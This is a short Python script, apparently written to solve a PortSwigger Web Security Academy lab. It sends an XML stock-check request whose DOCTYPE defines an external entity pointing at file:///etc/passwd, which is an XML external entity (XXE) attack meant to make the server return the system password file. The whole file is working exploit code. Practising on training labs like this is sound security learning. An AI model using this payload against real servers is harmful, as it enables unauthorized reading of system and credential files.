import requests

DOMAIN = "0ae60048049c1445838f2397009500e8.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}

def XXE():
    data = f"""<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd">]><stockCheck><productId>&ext;</productId><storeId>1</storeId></stockCheck>"""

    response = requests.post(f"https://{DOMAIN}/product/stock", headers=HEADERS, data=data)

    print(response.text)


XXE()